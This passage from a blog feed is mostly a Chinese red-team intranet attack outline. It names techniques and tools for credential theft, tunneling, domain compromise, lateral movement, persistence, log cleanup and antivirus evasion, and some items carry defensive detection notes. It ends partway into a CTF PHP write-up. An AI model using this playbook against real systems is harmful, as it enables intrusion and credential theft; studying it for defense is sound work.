class="line">获取本机的累计开机时长</span><br><span class="line">获取本机arp / dns缓存</span><br><span class="line">获取当前机器环境变量 [ 主要想看看目标机器上有无python,jdk,ruby...等语言的执行环境,后期可设法利用 ]</span><br><span class="line">获取当前系统所有本地用户及组列表</span><br><span class="line">获取当前系统host文件内容</span><br><span class="line">获取当前机器硬件设备信息[ 主要为判断当前机器是否为虚拟机 ]</span><br><span class="line">远程截屏捕捉目标用户敏感操作</span><br><span class="line"></span><br><span class="line">由于上述大部分的搜集动作都是基于系统内置工具和接口,故,可完全依靠EDR来实时捕捉各类敏感进程上报恶意操作</span><br></pre></td></tr></table></figure></li><li><p>利用当前已控 “跳板机”, 分析目标内网大致网络拓扑 及 所有关键性业务机器分布 </p></li><li><p>批量抓取内网所有windows机器名 和 所在 “域” &#x2F; “工作组名” [smb探测扫描]</p></li><li><p>针对内网的各种高危敏感服务定位[“安全” 端口扫描 (在避免对方防护报警拦截的情况下进行各种常规服务探测识别)]</p></li><li><p>内网批量 Web Banner 抓取,获取关键目标业务系统如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">内网各种文件[共享]服务器</span><br><span class="line">内网各类web服务器  [ 可用于后期留入口 ]</span><br><span class="line">内网各类数据库服务器</span><br><span class="line">内网邮件服务器  [ 可用于后期留入口 ]</span><br><span class="line">内网Vpn服务器  [ 可用于后期留入口 ]</span><br><span class="line">内网各类常规资产状态监控服务器,eg: zabbix,nagios,cacti...</span><br><span class="line">内网各类防护的主控端,比如,防火墙,EDR,态势感知 产品的web主控端...</span><br><span class="line">内网日志服务器</span><br><span class="line">内网补丁服务器</span><br><span class="line">内网各类OA,ERP,CRM,SRM,HR系统... </span><br><span class="line">内网打印服务器</span><br><span class="line">内网 MES 系统 </span><br><span class="line">内网虚拟化服务器 / 超融合平台 [Vmware ESX]</span><br><span class="line">内网堡垒机...</span><br><span class="line">内网运维,研发 部门员工的机器</span><br><span class="line">内网路由,交换设备...</span><br><span class="line">等等等...</span><br><span class="line"></span><br><span class="line">针对以上的各种常规内网探测扫描,其实在流量上都会有非常清晰的表现</span><br><span class="line">通过在一些关键节点设备/服务器上部署探针搜集流量</span><br><span class="line">再配合大数据关联分析查找各种敏感特征,理论上是相对容易发现各类扫描探测痕迹的</span><br></pre></td></tr></table></figure></li><li><p>针对各类已知系统高危RCE漏洞的批量探测识别与利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MS08-067 [ 其实,某些特殊行业的系统可能非常老,极少更新,故,还是有存在的可能 ]</span><br><span class="line">MS17-010</span><br><span class="line">CVE-2019-0708</span><br><span class="line"></span><br><span class="line">其实针对此类漏洞的攻击利用识别,就显得比较直白了</span><br><span class="line">通过深入分析每种漏洞在实际攻击利用过程所产生的一些典型 流量特征 和 系统日志即可大致判断</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x07-内网安全-各类敏感凭证-“搜集”-与-“窃取”"><a href="#0x07-内网安全-各类敏感凭证-“搜集”-与-“窃取”" class="headerlink" title="0x07 内网安全  [ 各类敏感凭证 “搜集” 与 “窃取” ]"></a>0x07 内网安全  [ 各类敏感凭证 “搜集” 与 “窃取” ]</h3><ul><li><p>主动密码搜集 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">注:如下某些操作肯定是需要事先自己想办法先拿到管理权限或者在指定用户权限下才能正常进行的</span><br><span class="line">此处不再赘述, 此项非防御重点, 因为压根也不好防</span><br><span class="line"></span><br><span class="line">批量抓取当前机器上的 &quot;各类基础服务配置文件中保存的各种账号密码&quot;</span><br><span class="line">   比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic...)...</span><br><span class="line">想办法 &quot;控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表&quot;</span><br><span class="line">   比如, *.ls,*.doc,*.docx, *.txt....</span><br><span class="line">抓取各类 &quot;数据库客户端工具中保存各种数据库连接账号密码</span><br><span class="line">   比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]</span><br><span class="line"></span><br><span class="line">抓取当前系统 &quot;注册表中保存的各类账号密码hash&quot; [ Windows ]</span><br><span class="line">抓取当前系统所有 &quot;本地用户的明文密码/hash&quot; [ Windows &amp; linux ]</span><br><span class="line">抓取当前系统的所有 &quot;用户token&quot; [ Windows ]</span><br><span class="line">抓取 &quot;windows凭据管理器中保存的各类连接账号密码&quot;</span><br><span class="line">抓取 &quot;MSTSC 客户端中保存的所有rdp连接账号密码&quot;</span><br><span class="line">抓取各类 &quot;VNC客户端工具中保存的连接密码&quot;</span><br><span class="line">抓取 &quot;GPP目录下保存的各类账号密码&quot; [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]</span><br><span class="line">抓取各类 &quot;SSH客户端工具中保存的各种linux系统连接账号密码&quot;, SecureCRT,Xshell,WinSCP,putty</span><br><span class="line">抓取各类 &quot;浏览器中保存的各种web登录密码&quot;,Chrome [360浏览器],Firefox,IE,QQ浏览器</span><br><span class="line">抓取各类 &quot;数据库表中保存的各类账号密码hash&quot;</span><br><span class="line">抓取各类 &quot;FTP客户端工具中保存的各种ftp登录账号密码&quot;, filezila, xftp...</span><br><span class="line">抓取各类 &quot;邮件客户端工具中保存的各种邮箱账号密码&quot;, forxmail, thunderbird...</span><br><span class="line">抓取各类 &quot;SVN客户端工具中保存的所有连接账号密码及项目地址&quot;</span><br><span class="line">抓取各类 &quot;VPN客户端工具中保存的各种vpn链接账号密码&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>被动密码搜集 [ 等着管理员自己来送密码 ] </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[注: 某些操作肯定是需要事先自己想办法先拿到管理权限后才能正常进行的, 此处不再赘述 , 是防御重点]</span><br><span class="line"></span><br><span class="line">Windows SSP [持久化/内存]</span><br><span class="line">Hook PasswordChangeNotify [持久化/内存]</span><br><span class="line">OWA 登录账号密码截获</span><br><span class="line">截获mstsc.exe中输入的rdp连接账号密码</span><br><span class="line">linux 别名记录利用</span><br><span class="line">本机明文密码嗅探 [ http,ftp,pop3... ]</span><br><span class="line">传统键盘记录</span><br><span class="line">windows蓝屏技巧 [ 此操作主要为应对不时之需,比如,搞蓝屏,登管理员登录抓密码 ]</span><br></pre></td></tr></table></figure></li><li><p>Hash爆破:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hashcat [ 完全拼GPU ] </span><br></pre></td></tr></table></figure></li></ul><h3 id="0x08-内网安全-内网常用-“隧道””-x2F-“转发””-x2F-“代理””-穿透手法-提炼汇总-，防御重点"><a href="#0x08-内网安全-内网常用-“隧道””-x2F-“转发””-x2F-“代理””-穿透手法-提炼汇总-，防御重点" class="headerlink" title="0x08 内网安全 [ 内网常用 “隧道”” &#x2F; “转发”” &#x2F; “代理”” 穿透手法 提炼汇总 ，防御重点 ]"></a>0x08 内网安全 [ 内网常用 “隧道”” &#x2F; “转发”” &#x2F; “代理”” 穿透手法 提炼汇总 ，防御重点 ]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">出网流量刺探</span><br><span class="line">比如,http,dns,以及一些穿透性相对较好的tcp端口... </span><br><span class="line">这种操作一般都会配合wmi,smb,ssh远程执行,在内网批量快速识别出能出网的机器</span><br><span class="line"></span><br><span class="line">常规 HTTP脚本代理</span><br><span class="line">abptts,Neo-reGeorg,reGeorg,tunna,reduh...</span><br><span class="line">不得不说,公开脚本在实战中多多少少都会有些问题,还需要根据自己的实际目标环境深度改进才行</span><br><span class="line"></span><br><span class="line">SSH 隧道</span><br><span class="line">加密端口转发,socks 实战用途非常灵活,此处不细说 ]</span><br><span class="line"></span><br><span class="line">Rdp 隧道</span><br><span class="line"></span><br><span class="line">反向SOCKS</span><br><span class="line">nps, frp, ssf, CobaltStrike(socks4a &amp; rportfwd ), sscoks ... </span><br><span class="line">工具基本都不免杀了,需要自行处理</span><br><span class="line"></span><br><span class="line">正反向TCP 端口转发</span><br><span class="line">非常多,就不一一列举, eg: nginx,netsh,socat,ew....</span><br><span class="line"></span><br><span class="line">DNS加密隧道</span><br><span class="line"></span><br><span class="line">Web端口复用</span><br><span class="line"></span><br><span class="line">需要明白的是,在一般的红队场景中</span><br><span class="line">入侵者为了尽可能躲避各种检测设备的流量解析,很多此类工具都会采用各种各样的方式来加密传输流量,以此来保证自己有更强的穿透性</span><br></pre></td></tr></table></figure><h3 id="0x09-域内网安全-域内常用攻击手法-域渗透-，提炼汇总，防御重点"><a href="#0x09-域内网安全-域内常用攻击手法-域渗透-，提炼汇总，防御重点" class="headerlink" title="0x09 域内网安全 [ 域内常用攻击手法 ( 域渗透 )，提炼汇总，防御重点 ]"></a>0x09 域内网安全 [ 域内常用攻击手法 ( 域渗透 )，提炼汇总，防御重点 ]</h3><ul><li><p>针对当前域的一些常规信息搜集[ 其实现实中,只需要一个BloodHound &amp; Pingcastle足矣,就是工具需要自行事先免杀好]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">获取当前域内的完整域管列表</span><br><span class="line">获取当前域内的所有域控机器名列表</span><br><span class="line">获取当前域内的所有DNS服务器机器名列表</span><br><span class="line">获取当前域内的所有SPN</span><br><span class="line">获取当前域内的所有OU</span><br><span class="line">获取当前域内的所有用户 &amp; 用户组列表</span><br><span class="line">获取当前域信任关系 [ 跨域渗透 ]</span><br><span class="line">获取当前域内所有机器的开机时间</span><br><span class="line">获取当前域内网段及web站点</span><br><span class="line">获取当前域内策略 [ 主要是为了了解密码策略 ]</span><br><span class="line">获取当前域林</span><br><span class="line">.......</span><br></pre></td></tr></table></figure></li><li><p>快速获取目标域控权限的一些常规手法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">搜集GPP 目录 [ 其中可能保存的有域账号密码,不仅仅是存在XML里的那些,NETLOGON目录中的某些脚本同样也可能保存有账号密码 ] </span><br><span class="line">服务票据hash破解(&quot;尤其是域管用户的&quot;) [ kerberoast ]</span><br><span class="line">批量对域用户进行单密码尝试 [ 喷射,利用ADSI接口,日志id 4771 ]</span><br><span class="line">Kerberos 委派利用</span><br><span class="line">爆破LDAP</span><br><span class="line">Exchange特定ACL滥用</span><br><span class="line">SSP 截获关键服务器登录密码</span><br><span class="line">利用各类基础服务在内网快速 getshell [ 弱口令, 各类JAVA中间件已知Nday漏洞, 常规Web漏洞... ],在内网循环抓各类密码,直至</span><br><span class="line">  抓到域管密码</span><br><span class="line">  抓到域管令牌</span><br><span class="line">DNSAdmin 组成员滥用 [ 加载执行恶意dll ]</span><br><span class="line">LAPS</span><br><span class="line">MS14-068 [ 如今实际中已很少遇到了 ]</span><br><span class="line">LLMNR/NBNS欺骗  + SMB relay [ 真实在实战中其实用的并不多 ]</span><br></pre></td></tr></table></figure></li><li><p>域内后渗透敏感信息搜集分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">获取所有DNS记录</span><br><span class="line">导出当前域的完整LDAP数据库</span><br><span class="line">提取当前域的ntds.dit [ 域内账号密码数据库 ]</span><br><span class="line">  Dcsync同步</span><br><span class="line">  Volume Shadow Copy Service</span><br></pre></td></tr></table></figure></li><li><p>域内指定用户登录ip定位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用OWA登录日志</span><br><span class="line">利用域控服务器登录日志</span><br><span class="line">指定服务银票 [ Silver Ticket ]</span><br><span class="line">除此之外,就是下面的各类常规横向手法</span><br></pre></td></tr></table></figure></li><li><p>域内指定用户机器定向控制技巧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">绑定用户登录脚本</span><br><span class="line">利用GPO下发 [实际上,利用GPO能做的事情还非常非常多]</span><br><span class="line">PTT [ 票据传递 ]</span><br></pre></td></tr></table></figure></li><li><p>针对域管的各种权限维持技巧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">金票</span><br><span class="line">Skeleton Key</span><br><span class="line">DSRM密码同步</span><br><span class="line">OWA后门</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>域内Exchange 邮件数据脱取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用Ews接口通过PTH的方式脱邮件</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x10-内网安全-跨平台横向渗透-远程执行-，防御重点-“重中之重”"><a href="#0x10-内网安全-跨平台横向渗透-远程执行-，防御重点-“重中之重”" class="headerlink" title="0x10 内网安全 [ 跨平台横向渗透 (远程执行)，防御重点 ( “重中之重” ) ]"></a>0x10 内网安全 [ 跨平台横向渗透 (远程执行)，防御重点 ( “重中之重” ) ]</h3><ul><li><p>从 Windows平台 横向至  Windows平台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">注: 以下某些远程执行方式, 即可直接用明文账号密码 亦可 基于pth来进行, 不局限</span><br><span class="line"></span><br><span class="line">远程服务管理 [ SCM ]</span><br><span class="line">远程创建执行计划任务 [ Scheduled Tasks ]</span><br><span class="line">WMI 远程执行 [ WMI ]</span><br><span class="line">针对高版本Windows 的WinRM 远程执行 </span><br><span class="line">DCOM 远程执行 [ 需要目标Windows机器事先已关闭防火墙 ]</span><br><span class="line">高版本 RDP 远程执行</span><br><span class="line">利用MSSQL数据库存储过程来变相远程执行</span><br><span class="line">利用Oracle数据库存储过程来变相远程执行</span><br><span class="line">SMB [ PTH (hash传递) ]</span><br><span class="line">RDP[MSTSC] 反向渗透 [ 即可用于突破某些隔离, 亦可通过云(Windows vps)直接反控目标管理员个人机 CVE-2019-0887 ]</span><br><span class="line">利用补丁服务器下发执行</span><br><span class="line">利用EDR主控端定向下发执行</span><br></pre></td></tr></table></figure></li><li><p>从 Windows平台 横向至 *inux平台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink 或者 基于Windows SSH库自行开发各种远程执行小工具</span><br></pre></td></tr></table></figure></li><li><p>从 *inux平台 横向至 Windows 平台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">一般都会将 impacket套件中的各个常用py脚本事先直接打包成可执行文件, 然后丢到目标linux系统中去执行,如下</span><br><span class="line">wmiexec_linux_x86_64</span><br><span class="line">smbexec_linux_x86_64</span><br><span class="line">psexec_linux_x86_64</span><br><span class="line">atexec_linux_x86_64</span><br><span class="line">dcomexec_linux_x86_64</span><br><span class="line"></span><br><span class="line">另外,还有一些基于go的工具,同样也可以编译成可执行文件之后再丢上去执行</span><br></pre></td></tr></table></figure></li><li><p>从 *inux平台 横向至 *inux 平台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux 自带的ssh客户端工具套件, 默认就可以用来进行远程执行</span><br></pre></td></tr></table></figure></li><li><p>各种远程下载技巧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget [ win &amp; linux ]</span><br><span class="line">curl [ win &amp; linux ]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">之所以没着重提以下这些系统内置的远程下载执行工具,主要还是因为事先已经明确知道</span><br><span class="line">某些杀软环境下它肯定会被拦截,所以事先就直接把它弃用了,尤其针对红队这种场景,这些东西根本不在乎多,有一个能用好用的即可</span><br><span class="line"></span><br><span class="line">CertUtil.exe</span><br><span class="line">Bitsadmin.exe</span><br><span class="line">Regsvr32.exe</span><br><span class="line">Rundll32.exe</span><br><span class="line">Powershell.exe</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x11-内网安全-权限维持，防御重点-注-有些细节此处并未展开详细说明"><a href="#0x11-内网安全-权限维持，防御重点-注-有些细节此处并未展开详细说明" class="headerlink" title="0x11 内网安全 [ 权限维持，防御重点 ] [ 注: 有些细节此处并未展开详细说明 ]"></a>0x11 内网安全 [ 权限维持，防御重点 ] [ 注: 有些细节此处并未展开详细说明 ]</h3><ul><li><p>边界入口权限维持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">OWA 登录口 [ 账号密码,webshell ]</span><br><span class="line">VPN 登录口 [ 账号密码,shell ]</span><br><span class="line">其他 MAIL 登录口 [ 账号密码 ]</span><br><span class="line">边界 Web服务器 [ Webshell 驻留技巧 ]</span><br><span class="line">边界路由交换设备 [ 账号密码,shell ]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>Windows 单机系统维持 [临时]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">系统计划任务 [ 高权限/低权限 ]</span><br><span class="line">常规注册表自启动项 [ 用户权限/system权限 ]</span><br><span class="line">Mssql存储过程 [ 继承服务权限 ]</span><br><span class="line">WMI</span><br><span class="line">Winlogon</span><br><span class="line">CLR</span><br><span class="line">Logon Scripts</span><br><span class="line">MruPidlList</span><br><span class="line">Mof</span><br><span class="line">传统远控</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>linux 单机系统维持 [临时]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Patch SSH</span><br><span class="line">替换各类基础服务so [ PAM,Nginx,Rsync ...] </span><br><span class="line">系统计划任务</span><br><span class="line">传统应用层远控</span><br><span class="line">驱动层远控( 针对特定内核版本 )</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x12-痕迹处理"><a href="#0x12-痕迹处理" class="headerlink" title="0x12 痕迹处理"></a>0x12 痕迹处理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">web日志 [ 访问, 错误日志 ]</span><br><span class="line">数据库日志 [ 异常连接日志,慢查询日志 ]</span><br><span class="line">系统各类安全日志 [ ssh,rdp,smb,wmi,powershell....]</span><br><span class="line">各类邮箱登录日志</span><br><span class="line">域内敏感攻击利用日志 [ 金票,银票... ]</span><br><span class="line">此项为专业蓝队范畴,不再赘述</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="0x13-各类常用-C2-x2F-渗透-框架"><a href="#0x13-各类常用-C2-x2F-渗透-框架" class="headerlink" title="0x13 各类常用 C2 &#x2F; 渗透 框架"></a>0x13 各类常用 C2 &#x2F; 渗透 框架</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CobaltStrike [二次开发]</span><br><span class="line">  payload(beacon) 逆向/改进重写</span><br><span class="line">Metasploit [二次开发]</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="0x14-各类常用-Webshell管理工具"><a href="#0x14-各类常用-Webshell管理工具" class="headerlink" title="0x14 各类常用 Webshell管理工具"></a>0x14 各类常用 Webshell管理工具</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">菜刀caidao20160622</span><br><span class="line">冰蟹Behinder_v2.0.1</span><br><span class="line">蚁剑AntSword</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="0x15-免杀-及-各类防火墙对抗"><a href="#0x15-免杀-及-各类防火墙对抗" class="headerlink" title="0x15 免杀 及 各类防火墙对抗"></a>0x15 免杀 及 各类防火墙对抗</h3><ul><li><p>静态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">混淆:</span><br><span class="line">手工混淆,有源码的情况下,尝试逐个替换可能是关键特征字符串的 命名空间名, 函数名, 变量名, 字符串 等等等....</span><br><span class="line">工具混淆,针对各种语言的专业混淆工具 [ 有商业版 ]</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">加壳:</span><br><span class="line">一些常用公开壳的实际效果可能并不是太好 [ 也有商业壳 ]</span><br><span class="line">最好的方式还是尝试自己写壳,就是成本较高</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>动态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">反射</span><br><span class="line">shellcode 内存加解密执行 ( 对于现在的某些杀软来讲,可能并没什么卵用,别人拦的基本都是你的最终调用 )</span><br><span class="line">白利用</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">注:</span><br><span class="line">   理论上, 这些应该也没有什么非常通用的方法</span><br><span class="line">   大多还是事先针对特定的杀软针对性的不停调试分析出它到底怎么拦,怎么查的,然后再针对性的对症下药</span><br></pre></td></tr></table></figure></li><li><p>流量:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">域前置[利用大厂cdn]</span><br><span class="line">DNS加密隧道</span><br><span class="line">第三方公共邮箱上线</span><br><span class="line">第三方网盘上线</span><br><span class="line">第三方社交网站上线</span><br><span class="line">第三方匿名社交工具上线[eg: tg机器人,tor...]</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Red team </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Red team </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow_PHP特性</title>
      <link href="/2022/06/18/CTFShow/CTFshow_PHP%E7%89%B9%E6%80%A7/"/>
      <url>/2022/06/18/CTFShow/CTFshow_PHP%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="CTFshow"><a href="#CTFshow" class="headerlink" title="CTFshow"></a>CTFshow</h1><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="web89："><a href="#web89：" class="headerlink" title="web89："></a>web89：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错</p><p><strong>intval()</strong> 函数用于获取变量的整数值。</p><p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><p>先让第一个if不相等执行下一个语句，判断有无num，第二个if正则匹配[0-9]，第三个if如果等于1的话，执行if里边的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1</span><br></pre></td></tr></table></figure><h3 id="web90："><a href="#web90：" class="headerlink" title="web90："></a>web90：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 